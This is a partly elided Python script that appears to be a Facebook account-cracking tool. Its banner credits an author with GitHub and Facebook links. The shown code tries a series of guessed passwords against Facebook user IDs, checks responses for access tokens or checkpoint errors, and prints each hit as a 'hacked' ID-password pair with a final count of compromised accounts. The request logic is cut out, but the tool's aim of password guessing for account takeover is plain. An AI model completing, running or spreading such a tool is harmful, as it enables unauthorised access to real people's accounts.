...
\033[1;96m(~)\033[1;97m Owner : BdMohon  Baloch

\033[1;96m(~)\033[1;97m Github : https://github.com/bdmohonbaloch172

\033[1;96m(~)\033[1;97m Fb     : https://www.facebook.com/Baloch.Edit'X
\033[1;96m(~)\033[1;97m WhatsApp no: No

OK
\033[1;97m------------------BdMohonbaloch-----------------------------
...
def menu_select():
	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        ...
		        print("[bdmohon💪hacked] "+uid+" | "+pass1)
		    	...
		    	if "access_token" in d:
		            ...
		            print("\x1b[1;96m[bdmohon💪hacked] "+uid+" | "+pass1+"\x1b[1;0m")
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                if 'access_token' in d:
		                    ...
		                    print("\x1b[1;96m[bdmohon💪hacked] "+uid+" | "+pass2+"\x1b[1;0m")
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        print("[bdmohon💪hacked] "+uid+" | "+pass3)
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            print(" \x1b[1;96m[bdmohon💪hacked] "+uid+" | "+pass3+"\x1b[1;0m")
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    print("\x1b[1;96m[bdmohon💪hacked] "+uid+" | "+pass4+"\x1b[1;0m")
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            print("\x1b[1;96m[bdmohon💪hacked] "+uid+" | "+pass5+"\x1b[1;0m")
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    print("\x1b[1;96m[bdmohon💪hacked] "+uid+" | "+pass6+"\x1b[1;0m")
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            ...
		                                                            print("\x1b[1;96m[bdmohon💪hacked] "+uid+" | "+pass7+"\x1b[1;0m")
	...
	print ("[!] Total bdmohon🌹cp/bdmohon💪hacked : "+str(len(cps)) + "/"+str(len(oks)))
